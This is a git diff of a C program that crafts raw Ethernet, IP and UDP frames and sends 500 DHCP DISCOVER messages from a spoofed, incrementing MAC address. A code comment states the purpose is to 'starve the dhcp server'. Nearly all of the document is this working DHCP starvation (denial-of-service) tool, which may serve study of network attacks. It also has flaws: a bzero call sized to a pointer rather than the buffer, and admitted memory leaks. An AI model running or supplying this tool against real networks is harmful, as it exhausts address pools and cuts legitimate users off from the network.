@@ -61,6 +61,28 @@ struct in_addr* str_to_ip(const char* addr){
 }
 
 /**
+* compute the checksum, inspired by rfc1071 and
+* https://www.thegeekstuff.com/2012/05/ip-header-checksum
+*/
+void checksum(struct ip *hdr, int len){
+  int sum = 0;
+  hdr->ip_sum = sum;
+  uint16_t* word = (uint16_t*)hdr;
+
+  while (len > 1){
+    sum += *word++;
+    len -= 2;
+  }
+  if (len == 1){  // add leftover byte
+    uint8_t answer = *(u_char *)word;
+    sum += answer;
+  }
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  hdr->ip_sum = ~sum;
+}
+
+/**
 * Create, allocate and fill necessary values to ip header
 **/
 struct ip* get_ip_header(){
@@ -77,7 +99,7 @@ struct ip* get_ip_header(){
   hdr->ip_src = *str_to_ip(IP4_SRC_ADDR);        //Fill in ip addresses
   hdr->ip_dst = *str_to_ip(IP4_BROADCAST);
   hdr->ip_len = htons(DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN);
-  hdr->ip_sum = 0;          // hack, checksum should be disabled
+  checksum(hdr,IP4_HEADER_LEN);
   return hdr;
 }
 
@@ -95,38 +117,10 @@ struct udphdr* get_udp_header(){
   return udp_header;
 }
 
-
-int main(int argc, char** argv) {
-  char* interface_name = checkArgs(argc, argv); // get name of the interface
-  srand(time(NULL));
-  int sd = 0;
-  if ((sd = socket (PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-    err ("Failed to create socket", sd, 0);
-  }
-  uint8_t src_mac_addr[MAC_ADDR_LEN];  // initiate src mac adress
-  uint8_t dst_mac_addr[MAC_ADDR_LEN];  // set dst mac for broadcast
-  for (size_t i = 0; i < MAC_ADDR_LEN; i++) {
-    dst_mac_addr[i] = MAX_OCTET_HEX;
-    src_mac_addr[i] = MIN_OCTET_HEX;
-  }
-  increment_mac_addr(src_mac_addr);
-
-  struct sockaddr_ll interface;
-  if ((interface.sll_ifindex = if_nametoindex (interface_name)) == 0) {
-    err("if_nametoindex failed, wrong network interface name ?", ERR, 0);
-  }
-  // setup interface, see "man packet"
-  interface.sll_family = AF_PACKET;
-  memcpy(interface.sll_addr, src_mac_addr, MAC_ADDR_LEN * sizeof(uint8_t));
-  interface.sll_halen = ETH_ALEN;
-  interface.sll_pkttype = PACKET_BROADCAST; // Use broadcast packet
-  interface.sll_protocol = ETH_P_802_3;
-
-  struct ip* ip_header = get_ip_header();
-  struct udphdr* udp_header = get_udp_header();
-
-  unsigned char buffer[DHCP_BUFFER_SIZE];
-
+/**
+* Properly prepare dhcp discover message, rfc2132
+*/
+void make_discover(unsigned char* buffer, unsigned char* src_mac_addr){
   // fill the buffer with zeros and fill only relevant values
   bzero(buffer, sizeof(buffer));
   buffer[0] = (int) 1;      // Request 1
@@ -142,14 +136,56 @@ int main(int argc, char** argv) {
   buffer[31] = (int) src_mac_addr[3];
   buffer[32] = (int) src_mac_addr[4];
   buffer[33] = (int) src_mac_addr[5]; // skip the rest
-  buffer[34] = (int) 255;            //end
+  buffer[236] = (int) 99;             // option starts with MAGIC COOKIE
+  buffer[237] = (int) 130;
+  buffer[238] = (int) 83;
+  buffer[239] = (int) 99;             // MAGIC COOKIE end
+  buffer[240] = (int) 53;             // OPTION defining dhcp message type
+  buffer[241] = (int) 1;              // length of ^
+  buffer[242] = (int) 1;              // 1 == discover
+  buffer[243] = (int) 55;             // OPTION Requested items
+  buffer[244] = (int) 4;              // length of ^
+  buffer[245] = (int) 1;              // Subnet mask
+  buffer[246] = (int) 28;             // Broadcast
+  buffer[247] = (int) 3;              // Router
+  buffer[248] = (int) 15;             // Domain name
+  buffer[249] = (int) 255;            //end
+}
+
+
+int main(int argc, char** argv) {
+  char* interface_name = checkArgs(argc, argv); // get name of the interface
+  srand(time(NULL));
+  int sd = 0;
+  if ((sd = socket (PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+    err ("Failed to create socket", sd, 0);
+  }
+  uint8_t src_mac_addr[MAC_ADDR_LEN];  // initiate src mac adress
+  uint8_t dst_mac_addr[MAC_ADDR_LEN];  // set dst mac for broadcast
+  for (size_t i = 0; i < MAC_ADDR_LEN; i++) {
+    dst_mac_addr[i] = MAX_OCTET_HEX;
+    src_mac_addr[i] = MIN_OCTET_HEX;
+  }
+
+  struct sockaddr_ll interface;
+  if ((interface.sll_ifindex = if_nametoindex (interface_name)) == 0) {
+    err("if_nametoindex failed, wrong network interface name ?", ERR, 0);
+  }
+  interface.sll_family = AF_PACKET;   // setup interface, see "man packet"
+  interface.sll_halen = ETH_ALEN;
+  interface.sll_pkttype = PACKET_BROADCAST; // Use broadcast packet
+  interface.sll_protocol = ETH_P_802_3;
+
+  struct ip* ip_header = get_ip_header();
+  struct udphdr* udp_header = get_udp_header();
+
+  unsigned char buffer[DHCP_BUFFER_SIZE];
 
   int eth_msg_len = DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN + ETH_HEADER_LEN;
   unsigned char* eth_frame = (unsigned char*)malloc(eth_msg_len);
   check_null(eth_frame);
 
-  memcpy(eth_frame, src_mac_addr, 6 * sizeof(uint8_t));
-  memcpy(eth_frame + 6, dst_mac_addr, 6 * sizeof(uint8_t));
+  memcpy(eth_frame, dst_mac_addr, 6 * sizeof(uint8_t));
   eth_frame[12] = 0x08; // ETH_P_IP value
   eth_frame[13] = 0x00;
   /* L2 ends here */
@@ -157,14 +193,24 @@ int main(int argc, char** argv) {
   memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN, udp_header, UDP_HEADER_LEN * sizeof(uint8_t));
   memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, buffer, DHCP_BUFFER_SIZE * sizeof(uint8_t));
 
-  int sent = 0;
-  if ((sent = sendto (sd, eth_frame, eth_msg_len, 0, (struct sockaddr *) &interface, sizeof (interface))) <= 0) {
-    err("sendto() failed", sent, 0);
+  // place here only parts which depends on source MAC address, src mac address
+  // has to be changed in every iteration to starve the dhcp server
+  for (size_t i = 0; i < 500; i++) {
+    increment_mac_addr(src_mac_addr);
+    memcpy(interface.sll_addr, src_mac_addr, MAC_ADDR_LEN * sizeof(uint8_t));
+    make_discover(buffer, src_mac_addr);  // fill buffer with discover msg
+    memcpy(eth_frame + 6, src_mac_addr, 6 * sizeof(uint8_t));
+
+    int sent = 0;
+    if ((sent = sendto (sd, eth_frame, eth_msg_len, 0, (struct sockaddr *) &interface, sizeof (interface))) <= 0) {
+      err("sendto() failed", sent, 0);
+    }
   }
   if (close(sd) < 0) {
     err("Failed to close the socket", sd, 0);
   }
   free(udp_header);
+  //TODO: 2 mem leaks
   free(ip_header);
   free(eth_frame);
 }
